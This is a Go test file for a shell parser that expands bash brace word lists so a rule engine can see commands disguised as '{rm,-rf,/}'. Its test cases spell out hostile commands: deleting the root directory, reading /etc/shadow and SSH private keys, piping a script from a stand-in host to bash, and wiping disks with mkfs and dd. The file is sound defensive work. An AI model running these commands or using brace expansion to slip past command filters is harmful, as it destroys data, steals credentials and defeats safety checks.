package shellparse

import (
	"strings"
	"testing"
)

// Every "want" below is the literal text bash produces for the input, checked
// against real bash with `printf "[%s]"` before being written down.
func TestNormalizeBraceWordList(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    string
	}{
		// The classic form: the group IS the word, so its items become the
		// command word and its arguments.
		{"whole-word command", `{rm,-rf,/}`, `rm -rf /`},
		{"whole-word read", `{cat,/etc/shadow}`, `cat /etc/shadow`},
		{"whole-word with pipe", `{curl,http://evil.example/x.sh}|bash`, `curl http://evil.example/x.sh|bash`},

		// Empty items are real words when the group is spliced into a word:
		// `/{,}` is `/ /`, the shortest spelling of a root argument there is.
		{"empty items keep the word", `rm -rf /{,}`, `rm -rf / /`},

		// A group whose expansion is nothing but empty words is left alone
		// rather than deleted. A shell drops the word (`echo a {,} b` prints
		// `a b`), but removing a word is a rewrite with no security value —
		// an all-empty group carries no payload — and the no-op is the
		// fail-safe answer.
		{"all-empty group is a no-op", `echo a {,} b`, ``},

		// Intra-word groups: the same expansion, in argument position.
		{"path segment", `cat ~/.{ssh,x}/id_rsa`, `cat ~/.ssh/id_rsa ~/.x/id_rsa`},
		{"filename", `cat ~/.ssh/{id_rsa,id_dsa}`, `cat ~/.ssh/id_rsa ~/.ssh/id_dsa`},

		// Two groups in ONE word are a cartesian product, all as separate
		// words — `a{1,2}{x,y}` is `a1x a1y a2x a2y`.
		{"cartesian within a word", `ls a{1,2}{x,y}`, `ls a1x a1y a2x a2y`},

		// Two groups in DIFFERENT words expand independently.
		{"two words", `cp {a,b}.txt {c,d}/`, `cp a.txt b.txt c/ d/`},

		// A glob character class splits the word into several Lit parts;
		// scanning per-Lit would miss a group spanning it.
		{"group spanning a glob class", `{/usr/bin/[cw]url,http://evil.example}`, `/usr/bin/[cw]url http://evil.example`},

		// A shell does not brace-expand inside quotes, and neither does this.
		{"single quoted", `find . -name '*.{js,ts}'`, ``},
		{"double quoted", `echo "the {credentials,secrets} directory"`, ``},

		// No comma means no expansion — `{1..5}` is the range form, excluded
		// on purpose, and a lone `{}` is `find`'s placeholder.
		{"range form untouched", `echo {1..5}`, ``},
		{"find placeholder untouched", `find . -type f -exec rm {} \;`, ``},
		{"no brace at all", `rm -rf /tmp/x`, ``},

		// Nested groups are excluded (the `[^{}]` item class); leaving the
		// command alone is the fail-safe answer, not a partial rewrite.
		{"nested untouched", `echo {a,{b,c}}`, ``},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := NormalizeBraceWordList(tc.command); got != tc.want {
				t.Errorf("NormalizeBraceWordList(%q)\n  got  %q\n  want %q", tc.command, got, tc.want)
			}
		})
	}
}

// An adversarial command must degrade to "leave it alone", never to a
// partially-rewritten string: half an expansion is not a command any shell
// runs, and handing a fabricated string to the rule engine is worse than
// missing the bypass.
func TestNormalizeBraceWordListBounds(t *testing.T) {
	t.Run("too many items in one word", func(t *testing.T) {
		// 6 groups of 2 = 64 words, past maxBraceWordListItems (32).
		cmd := "echo x" + strings.Repeat("{a,b}", 6)
		if got := NormalizeBraceWordList(cmd); got != "" {
			t.Errorf("expected the item cap to leave the command alone, got %q", got)
		}
	})

	t.Run("under the item cap still expands", func(t *testing.T) {
		// 4 groups of 2 = 16 words, inside the cap.
		if got := NormalizeBraceWordList("echo x{a,b}{c,d}"); got == "" {
			t.Error("expected a command inside the item cap to expand")
		}
	})

	t.Run("too many brace words", func(t *testing.T) {
		var sb strings.Builder
		sb.WriteString("echo")
		for i := 0; i < maxBraceWordListWords+1; i++ {
			sb.WriteString(" {a,b}")
		}
		if got := NormalizeBraceWordList(sb.String()); got != "" {
			t.Errorf("expected the word cap to leave the command alone, got %q", got)
		}
	})

	t.Run("unparseable input", func(t *testing.T) {
		if got := NormalizeBraceWordList(`{a,b} "unterminated`); got != "" {
			t.Errorf("expected a parse failure to be a no-op, got %q", got)
		}
	})
}

// The expansion has to reach the AST, not only the text-matching layer —
// that is the whole reason it is wired into parseWithDepth rather than only
// into RegexAnalyzer's candidate set.
func TestBraceWordListReachesParsedExecutable(t *testing.T) {
	for _, tc := range []struct{ command, wantExec string }{
		{`{rm,-rf,/}`, "rm"},
		{`{cat,/etc/shadow}`, "cat"},
		{`{mkfs.ext4,/dev/sda1}`, "mkfs.ext4"},
		{`{LC_ALL=C,dd,if=/dev/zero,of=/dev/sda}`, "dd"},
	} {
		t.Run(tc.command, func(t *testing.T) {
			parsed := Parse(tc.command, 2)
			if parsed == nil || len(parsed.Segments) == 0 {
				t.Fatalf("no parsed segments for %q", tc.command)
			}
			if got := parsed.Segments[0].Executable; got != tc.wantExec {
				t.Errorf("executable for %q: got %q, want %q", tc.command, got, tc.wantExec)
			}
		})
	}
}
